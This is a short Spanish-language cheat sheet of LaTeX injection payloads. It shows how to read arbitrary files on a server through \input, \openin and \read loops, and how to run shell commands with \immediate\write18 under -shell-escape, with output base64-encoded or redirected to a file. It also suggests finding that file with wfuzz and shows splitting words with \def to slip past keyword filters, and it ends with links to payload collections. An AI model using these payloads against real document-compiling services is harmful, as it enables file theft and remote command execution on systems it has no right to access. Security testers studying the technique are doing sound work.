


```bash
pdflatex -shell-escape archivo
```

Si por alguna se esta ejecutando asi el pdflatex es algo inseguro ya que con esto se pueden ejecutar comandos 


```latex
\input{ruta del archivo}
```

Añadiendo esto puedes lograr incluir un archivo en un pdf esto aveces tiene errores al momento de incluir archivos con caracteres que tengan conflicto al momento de compilar

```latex
\immediate\write18{comando | base64 > archivo}
\input{archivo}
```

Con esto solucionas los errores al compilar ya que la salida la codifica en base 64 y luego lo manda a un archivo el cual si se puede leer para luego añadirlo al pdf y ya solo se tendria que decodificar


```latex
\newread\file
\openin\file=ruta del archivo
\read\file to\line
\text{\line}
\closein\file
```

Incluyendo esto puedes leer la primera linea de un archivo en especifico

```latex
\newread\file
\openin\file=ruta del archivo
\read\file to\line
\read\file to\line
\text{\line}
\closein\file
```


Si añades esta linea `\read\file to\line` varias veces veras solo la linea correspondiente a las veces que la colocaste por ejemplo si colocas `\read\file to\line` 2 veces entonces veras la linea 2

```latex
\newread\file
\openin\file=ruta del archivo
\read\file to\lineA
\read\file to\lineB
\text{\lineA\lineB}
\closein\file
```

Si se le asigna un nombre a casa linea podras ver las lineas juntas lastimosamente se mostrara todo en una sola linea

```latex
\lstinputlisting{ruta del archivo}
\newread\file
\openin\file=ruta del archivo
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Con esto puedes crear un bucle y asi leer todas las lineas de un archivo pero si alguna linea tiene algun caracter que no se pueda interpretar no se mostrara nada 


```latex
\immediate\write18{comando}
```

Al integrar esto te muestra el output del comando en un error de compilacion 


```latex
\immediate\write18{comando > archivo}
\newread\file
\openin\file=ruta del archivo
\read\file to\line
\text{\line}
\closein\file
```


```latex
\immediate\write18{comando > archivo}
```

Con este comando redireccionaras todas la salida de un comando a un archivo en especifico por lo general los archivos se general en el directorio compile el cual es facil de localizar con la herramienta wfuzz y asi sera mas facil de ver el output de un comando

```latex
\def\A{primera parte}
\def\B{segunda parte}
\A\B
```

Si hay algun filtro de una palabra con esto lo puedes evadir dividendo la palabra que esta restringida y luego concatenando las partes


Para mas informacion sobre las inyecciones latex y para ver algunos payload puedes acceder a los siguientes enlaces 

SalmonSec: https://salmonsec.com/cheatsheets/exploitation/latex_injection 
0daywork: https://0day.work/hacking-with-latex/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md




